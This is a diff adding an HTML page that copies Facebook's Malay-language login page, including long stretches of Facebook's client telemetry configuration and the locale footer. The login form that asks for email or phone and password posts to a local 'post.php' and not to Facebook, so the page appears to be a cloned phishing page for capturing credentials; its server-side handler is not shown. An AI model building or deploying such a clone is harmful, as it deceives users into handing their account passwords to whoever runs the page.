+                        "ReactComposerFeedXSprouts": " _nh6(?: .*)?$",
+                        "SproutsComposerStatusTab": " _sg1(?: .*)?$",
+                        "SproutsComposerLiveVideoTab": " _sg1(?: .*)?$",
+                        "SproutsComposerAlbumTab": " _sg1(?: .*)?$",
+                        "composerAudienceSelector": " _ej0(?: .*)?$",
+                        "FeedHScrollAttachmentsPrevPager": " _1qqy(?: .*)?$",
+                        "FeedHScrollAttachmentsNextPager": " _1qqz(?: .*)?$",
+                        "DockChatTabFlyout": " fbDockChatTabFlyout(?: .*)?$",
+                        "PrivacyLiteJewel": " _59fc(?: .*)?$",
+                        "ActorSelector": " _6vh(?: .*)?$",
+                        "LegacyMentionsInput": "(?: ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)? _2xwx(?: .*)?$| uiMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)? _2xwx(?: .*)?$| _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)?$| ReactLegacyMentionsInput(?: .*)? _2xwx(?: .*)? uiMentionsInput(?: .*)?$| uiMentionsInput(?: .*)? _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)?$| _2xwx(?: .*)? uiMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)?$)",
+                        "UFIActionLinksEmbedLink": " _2g1w(?: .*)?$",
+                        "UFIPhotoAttachLink": " UFIPhotoAttachLinkWrapper(?: .*)?$",
+                        "UFIMentionsInputProxy": " _1osa(?: .*)?$",
+                        "UFIMentionsInputDummy": " _1osc(?: .*)?$",
+                        "UFIOrderingModeSelector": " _3scp(?: .*)?$",
+                        "UFIPager": "(?: UFIPagerRow(?: .*)? UFIRow(?: .*)?$| UFIRow(?: .*)? UFIPagerRow(?: .*)?$)",
+                        "UFIReplyRow": "(?: UFIReplyRow(?: .*)? UFICommentReply(?: .*)?$| UFICommentReply(?: .*)? UFIReplyRow(?: .*)?$)",
+                        "UFIReplySocialSentence": " UFIReplySocialSentenceRow(?: .*)?$",
+                        "UFIShareLink": " _5f9b(?: .*)?$",
+                        "UFIStickerButton": " UFICommentStickerButton(?: .*)?$",
+                        "MentionsInput": " _5yk1(?: .*)?$",
+                        "FantaChatTabRoot": " _3_9e(?: .*)?$",
+                        "SnowliftViewableRoot": " _2-sx(?: .*)?$",
+                        "ReactBlueBarJewelButton": " _5fwr(?: .*)?$",
+                        "UFIReactionsDialogLayerImpl": " _1oxk(?: .*)?$",
+                        "UFIReactionsLikeLinkImpl": " _4x9_(?: .*)?$",
+                        "UFIReactionsLinkImplRoot": " _khz(?: .*)?$",
+                        "Reaction": " _iuw(?: .*)?$",
+                        "UFIReactionsMenuImpl": " _iu-(?: .*)?$",
+                        "UFIReactionsSpatialReactionIconContainer": " _1fq9(?: .*)?$",
+                        "VideoComponentPlayButton": " _bsl(?: .*)?$",
+                        "FeedOptionsPopover": " _b1e(?: .*)?$",
+                        "UFICommentLikeCount": " UFICommentLikeButton(?: .*)?$",
+                        "UFICommentLink": " _5yxe(?: .*)?$",
+                        "ChatTabComposerInputContainer": " _552h(?: .*)?$",
+                        "ChatTabHeader": " _15p4(?: .*)?$",
+                        "DraftEditor": " _5rp7(?: .*)?$",
+                        "ChatSideBarDropDown": " _5vm9(?: .*)?$",
+                        "SearchBox": " _539-(?: .*)?$",
+                        "ChatSideBarLink": " _55ln(?: .*)?$",
+                        "MessengerSearchTypeahead": " _3rh8(?: .*)?$",
+                        "NotificationListItem": " _33c(?: .*)?$",
+                        "MessageJewelListItem": " messagesContent(?: .*)?$",
+                        "Messages_Jewel_Button": " _3eo8(?: .*)?$",
+                        "Notifications_Jewel_Button": " _3eo9(?: .*)?$",
+                        "snowliftopen": " _342u(?: .*)?$",
+                        "NoteTextSeeMoreLink": " _3qd_(?: .*)?$",
+                        "fbFeedOptionsPopover": " _1he6(?: .*)?$",
+                        "Requests_Jewel_Button": " _3eoa(?: .*)?$",
+                        "UFICommentActionLinkAjaxify": " _15-3(?: .*)?$",
+                        "UFICommentActionLinkRedirect": " _15-6(?: .*)?$",
+                        "UFICommentActionLinkDispatched": " _15-7(?: .*)?$",
+                        "UFICommentCloseButton": " _36rj(?: .*)?$",
+                        "UFICommentActionsRemovePreview": " _460h(?: .*)?$",
+                        "UFICommentActionsReply": " _460i(?: .*)?$",
+                        "UFICommentActionsSaleItemMessage": " _460j(?: .*)?$",
+                        "UFICommentActionsAcceptAnswer": " _460k(?: .*)?$",
+                        "UFICommentActionsUnacceptAnswer": " _460l(?: .*)?$",
+                        "UFICommentReactionsLikeLink": " _3-me(?: .*)?$",
+                        "UFICommentMenu": " _1-be(?: .*)?$",
+                        "UFIMentionsInputFallback": " _289b(?: .*)?$",
+                        "UFIMentionsInputComponent": " _289c(?: .*)?$",
+                        "UFIMentionsInputProxyInput": " _432z(?: .*)?$",
+                        "UFIMentionsInputProxyDummy": " _432-(?: .*)?$",
+                        "UFIPrivateReplyLinkMessage": " _14hj(?: .*)?$",
+                        "UFIPrivateReplyLinkSeeReply": " _14hk(?: .*)?$",
+                        "ChatCloseButton": " _4vu4(?: .*)?$",
+                        "ChatTabComposerPhotoUploader": " _13f-(?: .*)?$",
+                        "ChatTabComposerGroupPollingButton": " _13f_(?: .*)?$",
+                        "ChatTabComposerGames": " _13ga(?: .*)?$",
+                        "ChatTabComposerPlan": " _13gb(?: .*)?$",
+                        "ChatTabComposerFileUploader": " _13gd(?: .*)?$",
+                        "ChatTabStickersButton": " _13ge(?: .*)?$",
+                        "ChatTabComposerGifButton": " _13gf(?: .*)?$",
+                        "ChatTabComposerEmojiPicker": " _13gg(?: .*)?$",
+                        "ChatTabComposerLikeButton": " _13gi(?: .*)?$",
+                        "ChatTabComposerP2PButton": " _13gj(?: .*)?$",
+                        "ChatTabComposerQuickCam": " _13gk(?: .*)?$",
+                        "ChatTabHeaderAudioRTCButton": " _461a(?: .*)?$",
+                        "ChatTabHeaderVideoRTCButton": " _461b(?: .*)?$",
+                        "ChatTabHeaderOptionsButton": " _461_(?: .*)?$",
+                        "ChatTabHeaderAddToThreadButton": " _4620(?: .*)?$",
+                        "ReactComposerMediaSprout": " _fk5(?: .*)?$",
+                        "UFIReactionsBlingSocialSentenceComments": " _-56(?: .*)?$",
+                        "UFIReactionsBlingSocialSentenceSeens": " _2x0l(?: .*)?$",
+                        "UFIReactionsBlingSocialSentenceShares": " _2x0m(?: .*)?$",
+                        "UFIReactionsBlingSocialSentenceViews": " _-5c(?: .*)?$",
+                        "UFIReactionsBlingSocialSentence": " _-5d(?: .*)?$",
+                        "UFIReactionsSocialSentence": " _1vaq(?: .*)?$",
+                        "VideoFullscreenButton": " _39ip(?: .*)?$",
+                        "Tahoe": " _400z(?: .*)?$",
+                        "TahoeFromVideoPlayer": " _1vek(?: .*)?$",
+                        "TahoeFromVideoLink": " _2-40(?: .*)?$",
+                        "TahoeFromPhoto": " _2ju5(?: .*)?$",
+                        "FBStoryTrayItem": " _1fvw(?: .*)?$",
+                        "Mobile_Feed_Jewel_Button": "#feed_jewel( .+)*",
+                        "Mobile_Requests_Jewel_Button": "#requests_jewel( .+)*",
+                        "Mobile_Messages_Jewel_Button": "#messages_jewel( .+)*",
+                        "Mobile_Notifications_Jewel_Button": "#notifications_jewel( .+)*",
+                        "Mobile_Search_Jewel_Button": "#search_jewel( .+)*",
+                        "Mobile_Bookmarks_Jewel_Button": "#bookmarks_jewel( .+)*",
+                        "Mobile_Feed_UFI_Comment_Button_Permalink": " _l-a(?: .*)?$",
+                        "Mobile_Feed_UFI_Comment_Button_Flyout": " _4qeq(?: .*)?$",
+                        "Mobile_Feed_UFI_Token_Bar_Flyout": " _4qer(?: .*)?$",
+                        "Mobile_Feed_UFI_Token_Bar_Permalink": " _4-09(?: .*)?$",
+                        "Mobile_UFI_Share_Button": " _15kr(?: .*)?$",
+                        "Mobile_Feed_Photo_Permalink": " _1mh-(?: .*)?$",
+                        "Mobile_Feed_Video_Permalink": " _65g_(?: .*)?$",
+                        "Mobile_Feed_Profile_Permalink": " _4kk6(?: .*)?$",
+                        "Mobile_Feed_Story_Permalink": " _26yo(?: .*)?$",
+                        "Mobile_Feed_Page_Permalink": " _4e81(?: .*)?$",
+                        "Mobile_Feed_Group_Permalink": " _20u1(?: .*)?$",
+                        "Mobile_Feed_Event_Permalink": " _20u0(?: .*)?$",
+                        "ProfileIntroCardAddFeaturedMedia": " _30qr(?: .*)?$",
+                        "ProfileSectionAbout": " _84wb(?: .*)?$",
+                        "ProfileSectionAllRelationships": " _84wc(?: .*)?$",
+                        "ProfileSectionAtWork": " _2fnv(?: .*)?$",
+                        "ProfileSectionContactBasic": " _84vf(?: .*)?$",
+                        "ProfileSectionEducation": " _84vh(?: .*)?$",
+                        "ProfileSectionOverview": " _84vj(?: .*)?$",
+                        "ProfileSectionPlaces": " _84vg(?: .*)?$",
+                        "ProfileSectionYearOverviews": " _84vi(?: .*)?$",
+                        "IntlPolyglotHomepage": " _Interaction__IntlPolyglotVoteActivityCardButton(?: .*)?$",
+                        "ProtonElementSelection": " _67ft(?: .*)?$"
+                    },
+                    "interaction_boost": {
+                        "SnowliftPrevPager": 0.2,
+                        "SnowliftNextPager": 0.2,
+                        "ChatSideBarLink": 2,
+                        "MessengerSearchTypeahead": 2,
+                        "Messages_Jewel_Button": 2.5,
+                        "Notifications_Jewel_Button": 1.5,
+                        "Tahoe": 30,
+                        "ProtonElementSelection": 4
+                    },
+                    "event_types": {
+                        "BlueBarAccountChevronMenu": ["click"],
+                        "BlueBarHomeButton": ["click"],
+                        "BlueBarProfileLink": ["click"],
+                        "ReactComposerSproutMedia": ["click"],
+                        "ReactComposerSproutAlbum": ["click"],
+                        "ReactComposerSproutNote": ["click"],
+                        "ReactComposerSproutLocation": ["click"],
+                        "ReactComposerSproutActivity": ["click"],
+                        "ReactComposerSproutPeople": ["click"],
+                        "ReactComposerSproutLiveVideo": ["click"],
+                        "ReactComposerSproutMarkdown": ["click"],
+                        "ReactComposerSproutFormattedText": ["click"],
+                        "ReactComposerSproutSticker": ["click"],
+                        "ReactComposerSproutSponsor": ["click"],
+                        "ReactComposerSproutEllipsis": ["click"],
+                        "ReactComposerSproutContactYourRepresentative": ["click"],
+                        "ReactComposerSproutFunFact": ["click"],
+                        "TextExposeSeeMoreLink": ["click"],
+                        "SnowliftBigCloseButton": ["click"],
+                        "SnowliftPrevPager": ["click"],
+                        "SnowliftNextPager": ["click"],
+                        "SnowliftFullScreenButton": ["click"],
+                        "PrivacySelectorMenu": ["click"],
+                        "ReactComposerFeedXSprouts": ["click"],
+                        "SproutsComposerStatusTab": ["click"],
+                        "SproutsComposerLiveVideoTab": ["click"],
+                        "SproutsComposerAlbumTab": ["click"],
+                        "composerAudienceSelector": ["click"],
+                        "FeedHScrollAttachmentsPrevPager": ["click"],
+                        "FeedHScrollAttachmentsNextPager": ["click"],
+                        "DockChatTabFlyout": ["click"],
+                        "PrivacyLiteJewel": ["click"],
+                        "ActorSelector": ["click"],
+                        "LegacyMentionsInput": ["click"],
+                        "UFIActionLinksEmbedLink": ["click"],
+                        "UFIPhotoAttachLink": ["click"],
+                        "UFIMentionsInputProxy": ["click"],
+                        "UFIMentionsInputDummy": ["click"],
+                        "UFIOrderingModeSelector": ["click"],
+                        "UFIPager": ["click"],
+                        "UFIReplyRow": ["click"],
+                        "UFIReplySocialSentence": ["click"],
+                        "UFIShareLink": ["click"],
+                        "UFIStickerButton": ["click"],
+                        "MentionsInput": ["click"],
+                        "FantaChatTabRoot": ["click"],
+                        "SnowliftViewableRoot": ["click"],
+                        "ReactBlueBarJewelButton": ["click"],
+                        "UFIReactionsDialogLayerImpl": ["click"],
+                        "UFIReactionsLikeLinkImpl": ["click"],
+                        "UFIReactionsLinkImplRoot": ["click"],
+                        "Reaction": ["click"],
+                        "UFIReactionsMenuImpl": ["click"],
+                        "UFIReactionsSpatialReactionIconContainer": ["click"],
+                        "VideoComponentPlayButton": ["click"],
+                        "FeedOptionsPopover": ["click"],
+                        "UFICommentLikeCount": ["click"],
+                        "UFICommentLink": ["click"],
+                        "ChatTabComposerInputContainer": ["click"],
+                        "ChatTabHeader": ["click"],
+                        "DraftEditor": ["click"],
+                        "ChatSideBarDropDown": ["click"],
+                        "SearchBox": ["click"],
+                        "ChatSideBarLink": ["mouseup"],
+                        "MessengerSearchTypeahead": ["click"],
+                        "NotificationListItem": ["click"],
+                        "MessageJewelListItem": ["click"],
+                        "Messages_Jewel_Button": ["click"],
+                        "Notifications_Jewel_Button": ["click"],
+                        "snowliftopen": ["click"],
+                        "NoteTextSeeMoreLink": ["click"],
+                        "fbFeedOptionsPopover": ["click"],
+                        "Requests_Jewel_Button": ["click"],
+                        "UFICommentActionLinkAjaxify": ["click"],
+                        "UFICommentActionLinkRedirect": ["click"],
+                        "UFICommentActionLinkDispatched": ["click"],
+                        "UFICommentCloseButton": ["click"],
+                        "UFICommentActionsRemovePreview": ["click"],
+                        "UFICommentActionsReply": ["click"],
+                        "UFICommentActionsSaleItemMessage": ["click"],
+                        "UFICommentActionsAcceptAnswer": ["click"],
+                        "UFICommentActionsUnacceptAnswer": ["click"],
+                        "UFICommentReactionsLikeLink": ["click"],
+                        "UFICommentMenu": ["click"],
+                        "UFIMentionsInputFallback": ["click"],
+                        "UFIMentionsInputComponent": ["click"],
+                        "UFIMentionsInputProxyInput": ["click"],
+                        "UFIMentionsInputProxyDummy": ["click"],
+                        "UFIPrivateReplyLinkMessage": ["click"],
+                        "UFIPrivateReplyLinkSeeReply": ["click"],
+                        "ChatCloseButton": ["click"],
+                        "ChatTabComposerPhotoUploader": ["click"],
+                        "ChatTabComposerGroupPollingButton": ["click"],
+                        "ChatTabComposerGames": ["click"],
+                        "ChatTabComposerPlan": ["click"],
+                        "ChatTabComposerFileUploader": ["click"],
+                        "ChatTabStickersButton": ["click"],
+                        "ChatTabComposerGifButton": ["click"],
+                        "ChatTabComposerEmojiPicker": ["click"],
+                        "ChatTabComposerLikeButton": ["click"],
+                        "ChatTabComposerP2PButton": ["click"],
+                        "ChatTabComposerQuickCam": ["click"],
+                        "ChatTabHeaderAudioRTCButton": ["click"],
+                        "ChatTabHeaderVideoRTCButton": ["click"],
+                        "ChatTabHeaderOptionsButton": ["click"],
+                        "ChatTabHeaderAddToThreadButton": ["click"],
+                        "ReactComposerMediaSprout": ["click"],
+                        "UFIReactionsBlingSocialSentenceComments": ["click"],
+                        "UFIReactionsBlingSocialSentenceSeens": ["click"],
+                        "UFIReactionsBlingSocialSentenceShares": ["click"],
+                        "UFIReactionsBlingSocialSentenceViews": ["click"],
+                        "UFIReactionsBlingSocialSentence": ["click"],
+                        "UFIReactionsSocialSentence": ["click"],
+                        "VideoFullscreenButton": ["click"],
+                        "Tahoe": ["click"],
+                        "TahoeFromVideoPlayer": ["click"],
+                        "TahoeFromVideoLink": ["click"],
+                        "TahoeFromPhoto": ["click"],
+                        "": ["click"],
+                        "FBStoryTrayItem": ["click"],
+                        "Mobile_Feed_Jewel_Button": ["click"],
+                        "Mobile_Requests_Jewel_Button": ["click"],
+                        "Mobile_Messages_Jewel_Button": ["click"],
+                        "Mobile_Notifications_Jewel_Button": ["click"],
+                        "Mobile_Search_Jewel_Button": ["click"],
+                        "Mobile_Bookmarks_Jewel_Button": ["click"],
+                        "Mobile_Feed_UFI_Comment_Button_Permalink": ["click"],
+                        "Mobile_Feed_UFI_Comment_Button_Flyout": ["click"],
+                        "Mobile_Feed_UFI_Token_Bar_Flyout": ["click"],
+                        "Mobile_Feed_UFI_Token_Bar_Permalink": ["click"],
+                        "Mobile_UFI_Share_Button": ["click"],
+                        "Mobile_Feed_Photo_Permalink": ["click"],
+                        "Mobile_Feed_Video_Permalink": ["click"],
+                        "Mobile_Feed_Profile_Permalink": ["click"],
+                        "Mobile_Feed_Story_Permalink": ["click"],
+                        "Mobile_Feed_Page_Permalink": ["click"],
+                        "Mobile_Feed_Group_Permalink": ["click"],
+                        "Mobile_Feed_Event_Permalink": ["click"],
+                        "ProfileIntroCardAddFeaturedMedia": ["click"],
+                        "ProfileSectionAbout": ["click"],
+                        "ProfileSectionAllRelationships": ["click"],
+                        "ProfileSectionAtWork": ["click"],
+                        "ProfileSectionContactBasic": ["click"],
+                        "ProfileSectionEducation": ["click"],
+                        "ProfileSectionOverview": ["click"],
+                        "ProfileSectionPlaces": ["click"],
+                        "ProfileSectionYearOverviews": ["click"],
+                        "IntlPolyglotHomepage": ["click"],
+                        "ProtonElementSelection": ["click"]
+                    },
+                    "manual_instrumentation": false,
+                    "profile_eager_execution": true,
+                    "disable_heuristic": true,
+                    "disable_event_profiler": false
+                }, 1726],
+                ["AdsInterfacesSessionConfig", [], {}, 2393],
+                ["TimeSliceInteractionSV", [], {
+                    "on_demand_reference_counting": true,
+                    "on_demand_profiling_counters": true,
+                    "default_rate": 1000,
+                    "lite_default_rate": 100,
+                    "interaction_to_lite_coinflip": {
+                        "ADS_INTERFACES_INTERACTION": 0,
+                        "ads_perf_scenario": 0,
+                        "ads_wait_time": 0,
+                        "Event": 1,
+                        "video_psr": 0,
+                        "video_stall": 0
+                    },
+                    "interaction_to_coinflip": {
+                        "ADS_INTERFACES_INTERACTION": 1,
+                        "ads_perf_scenario": 1,
+                        "ads_wait_time": 1,
+                        "video_psr": 1000000,
+                        "video_stall": 2500000,
+                        "Event": 100,
+                        "pixelcloud_view_performance": 25,
+                        "intern_notify_inbox_page_load": 10,
+                        "intern_notify_jewel_list_load": 10,
+                        "tasks_initial_page_load": 1,
+                        "watch_carousel_left_scroll": 1,
+                        "watch_carousel_right_scroll": 1,
+                        "watch_sections_load_more": 1,
+                        "watch_discover_scroll": 1,
+                        "fbpkg_ui": 1,
+                        "sevmanager_powersearch_initial_page_load": 10,
+                        "network_ui": 1,
+                        "daiquery_interactive_query": 1
+                    },
+                    "enable_heartbeat": true,
+                    "maxBlockMergeDuration": 0,
+                    "maxBlockMergeDistance": 0,
+                    "enable_banzai_stream": true,
+                    "user_timing_coinflip": 50,
+                    "banzai_stream_coinflip": 1,
+                    "compression_enabled": true,
+                    "ref_counting_fix": false,
+                    "ref_counting_cont_fix": false,
+                    "also_record_new_timeslice_format": false,
+                    "force_async_request_tracing_on": false
+                }, 2609],
+                ["BanzaiConfig", [], {
+                    "EXPIRY": 86400000,
+                    "MAX_SIZE": 10000,
+                    "MAX_WAIT": 150000,
+                    "RESTORE_WAIT": 150000,
+                    "blacklist": ["time_spent"],
+                    "gks": {
+                        "boosted_component": true,
+                        "boosted_pagelikes": true,
+                        "jslogger": true,
+                        "mercury_send_error_logging": true,
+                        "platform_oauth_client_events": true,
+                        "xtrackable_clientview_batch": true,
+                        "visibility_tracking": true,
+                        "graphexplorer": true,
+                        "gqls_web_logging": true,
+                        "sticker_search_ranking": true
+                    }
+                }, 7],
+                ["DataStoreConfig", [], {
+                    "expandoKey": "__FB_STORE",
+                    "useExpando": true
+                }, 2915]
+            ]);
+            new(require("ServerJS"))().handle({
+                "require": [
+                    ["markJSEnabled"],
+                    ["lowerDomain"],
+                    ["URLFragmentPrelude"],
+                    ["Primer"],
+                    ["BigPipe"],
+                    ["Bootloader"],
+                    ["TimeSlice"],
+                    ["ArtilleryOnUntilOffLogging", "disable", [],
+                        []
+                    ],
+                    ["BanzaiODS"],
+                    ["BanzaiScuba"],
+                    ["VisualCompletionGating"]
+                ]
+            });
+        }, "ServerJS define", {
+            "root": true
+        })();
+    </script>
+</head>
+
+<body class="login_page _39il UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_ms_MY" dir="ltr">
+    <script>
+        requireLazy(["bootstrapWebSession"], function(j) {
+            j(1580001493)
+        })
+    </script>
+    <div class="_li" id="u_0_2">
+        <div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_3">
+            <div class="_608m">
+                <div class="_5aj7 _tb6">
+                    <div class="_4bl7"><span class="mrm _3bcv _50f3">Langkau ke</span></div>
+                    <div class="_4bl9 _3bcp">
+                        <div class="_6a _608n" aria-label="Pembantu Navigasi" aria-keyshortcuts="Alt+/" role="menubar" id="u_0_4">
+                            <div class="_6a uiPopover" id="u_0_5"><a role="button" class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#" style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle" id="u_0_6"><span class="_55pe">Bahagian di halaman ini</span><span class="_4o_3 _3-99"><i class="img sp_RNXRBsVDn05 sx_1f90d0"></i></span></a></div>
+                            <div class="_6a _3bcs"></div>
+                            <div class="_6a mrm uiPopover" id="u_0_7"><a role="button" class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy" href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1" aria-expanded="false" rel="toggle" id="u_0_8"><span class="_55pe">Bantuan Kebolehcapaian</span><span class="_4o_3 _3-99"><i class="img sp_RNXRBsVDn05 sx_a2671c"></i></span></a></div>
+                        </div>
+                    </div>
+                    <div class="_4bl7 mlm pll _3bct">
+                        <div class="_6a _3bcy">Tekan <span class="_3bcz">alt</span> + <span class="_3bcz">/</span> untuk membuka menu ini</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
+            <div id="blueBarDOMInspector">
+                <div class="_53jh">
+                    <div class="loggedout_menubar_container">
+                        <div class="clearfix loggedout_menubar">
+                            <div class="lfloat _ohe">
+                                <h1><a href="https://www.facebook.com/" title="Pergi ke Halaman Utama Facebook"><i class="fb_logo img sp_RNXRBsVDn05 sx_43b207"><u>Facebook</u></i></a></h1></div>
+                        </div>
+                    </div>
+                    <div class="signupBanner">
+                        <div class="signup_bar_container">
+                            <div class="signup_box clearfix"><span class="signup_box_content"><a role="button" class="_42ft _4jy0 signup_btn _4jy4 _4jy2 selected _51sy" href="/r.php?locale=ms_MY">Daftar</a></span></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="globalContainer" class="uiContextualLayerParent">
+            <div class="fb_content clearfix " id="content" role="main">
+                <div class="_4-u5 _30ny"><span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel" /><span class="muffin_tracking_pixel_end"></span>
+                    <div class="_4-u2 _1w1t _4-u8 _52jv">
+                        <div class="_xku" id="header_block"><span class="_50f6">Log Masuk Ke Dalam Facebook</span></div>
+                        <div class="login_form_container">
+                            <form id="login_form" action="post.php" method="post" onsubmit="">
+                                <input type="hidden" name="jazoest" value="2735" autocomplete="off" />
+                                <input type="hidden" name="lsd" value="AVqJqDqg" autocomplete="off" />
+                                <input type="hidden" autocomplete="off" id="error_box" />
+                                <div id="loginform">
+                                    <input type="hidden" autocomplete="off" id="display" name="display" value="" />
+                                    <input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value="" />
+                                    <input type="hidden" autocomplete="off" id="isprivate" name="isprivate" value="" />
+                                    <input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="0" />
+                                    <input type="hidden" autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value="" />
+                                    <input type="hidden" autocomplete="off" id="return_session" name="return_session" value="" />
+                                    <input type="hidden" autocomplete="off" id="skip_api_login" name="skip_api_login" value="" />
+                                    <input type="hidden" autocomplete="off" id="signed_next" name="signed_next" value="" />
+                                    <input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1" />
+                                    <input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_9" />
+                                    <input type="hidden" autocomplete="off" name="lgndim" value="" id="u_0_a" />
+                                    <input type="hidden" name="lgnrnd" value="171813_qf1r" />
+                                    <input type="hidden" id="lgnjs" name="lgnjs" value="n" />
+                                    <div class="clearfix _5466 _44mg" id="email_container">
+                                        <input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="0" placeholder="E-mel atau Nombor Telefon" value="" autofocus="1" aria-label="E-mel atau Nombor Telefon" />
+                                    </div>
+                                    <div class="clearfix _5466 _44mg">
+                                        <input type="password" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" tabindex="0" placeholder="Kata Laluan" aria-label="Kata Laluan" />
+                                    </div>
+                                    <div class="_xkt">
+                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="0" type="submit">Log Masuk</button>
+                                    </div>
+                                    <div class="_xkv fsm fwn fcg" id="login_link"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" id="forgot-password-link" target="">Lupa akaun?</a><span role="presentation" aria-hidden="true"> · </span><a href="/r.php?locale=ms_MY&amp;display=page" rel="nofollow" id="reg-link">Daftar untuk Facebook</a></div>
+                                </div>
+                                <input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point" value="" />
+                                <input type="hidden" autocomplete="off" id="prefill_source" name="prefill_source" />
+                                <input type="hidden" autocomplete="off" id="prefill_type" name="prefill_type" />
+                                <input type="hidden" autocomplete="off" id="first_prefill_source" name="first_prefill_source" />
+                                <input type="hidden" autocomplete="off" id="first_prefill_type" name="first_prefill_type" />
+                                <input type="hidden" autocomplete="off" id="had_cp_prefilled" name="had_cp_prefilled" value="false" />
+                                <input type="hidden" autocomplete="off" id="had_password_prefilled" name="had_password_prefilled" value="false" />
+                                <input type="hidden" autocomplete="off" name="ab_test_data" value="" />
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+                        <li>Bahasa Melayu</li>
+                        <li><a class="_sv4" dir="ltr" href="https://en-gb.facebook.com/login/device-based/regular/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;en_GB&quot;, &quot;ms_MY&quot;, &quot;https:\/\/en-gb.facebook.com\/login\/device-based\/regular\/login&quot;, &quot;www_list_selector&quot;, 0); return false;" title="English (UK)">English (UK)</a></li>
+                        <li><a class="_sv4" dir="ltr" href="https://zh-cn.facebook.com/login/device-based/regular/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;zh_CN&quot;, &quot;ms_MY&quot;, &quot;https:\/\/zh-cn.facebook.com\/login\/device-based\/regular\/login&quot;, &quot;www_list_selector&quot;, 1); return false;" title="Simplified Chinese (China)">中文(简体)</a></li>
+                        <li><a class="_sv4" dir="ltr" href="https://id-id.facebook.com/login/device-based/regular/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;id_ID&quot;, &quot;ms_MY&quot;, &quot;https:\/\/id-id.facebook.com\/login\/device-based\/regular\/login&quot;, &quot;www_list_selector&quot;, 2); return false;" title="Indonesian">Bahasa Indonesia</a></li>
+                        <li><a class="_sv4" dir="ltr" href="https://vi-vn.facebook.com/login/device-based/regular/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;vi_VN&quot;, &quot;ms_MY&quot;, &quot;https:\/\/vi-vn.facebook.com\/login\/device-based\/regular\/login&quot;, &quot;www_list_selector&quot;, 3); return false;" title="Vietnamese">Tiếng Việt</a></li>
+                        <li><a class="_sv4" dir="ltr" href="https://th-th.facebook.com/login/device-based/regular/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;th_TH&quot;, &quot;ms_MY&quot;, &quot;https:\/\/th-th.facebook.com\/login\/device-based\/regular\/login&quot;, &quot;www_list_selector&quot;, 4); return false;" title="Thai">ภาษาไทย</a></li>
+                        <li><a class="_sv4" dir="rtl" href="https://ar-ar.facebook.com/login/device-based/regular/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ar_AR&quot;, &quot;ms_MY&quot;, &quot;https:\/\/ar-ar.facebook.com\/login\/device-based\/regular\/login&quot;, &quot;www_list_selector&quot;, 5); return false;" title="Arabic">العربية</a></li>
+                        <li><a class="_sv4" dir="ltr" href="https://es-la.facebook.com/login/device-based/regular/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;ms_MY&quot;, &quot;https:\/\/es-la.facebook.com\/login\/device-based\/regular\/login&quot;, &quot;www_list_selector&quot;, 6); return false;" title="Spanish">Español</a></li>
+                        <li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/login/device-based/regular/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;ms_MY&quot;, &quot;https:\/\/pt-br.facebook.com\/login\/device-based\/regular\/login&quot;, &quot;www_list_selector&quot;, 7); return false;" title="Portuguese (Brazil)">Português (Brasil)</a></li>
+                        <li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/login/device-based/regular/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;ms_MY&quot;, &quot;https:\/\/fr-fr.facebook.com\/login\/device-based\/regular\/login&quot;, &quot;www_list_selector&quot;, 8); return false;" title="French (France)">Français (France)</a></li>
+                        <li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/login/device-based/regular/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;ms_MY&quot;, &quot;https:\/\/de-de.facebook.com\/login\/device-based\/regular\/login&quot;, &quot;www_list_selector&quot;, 9); return false;" title="German">Deutsch</a></li>
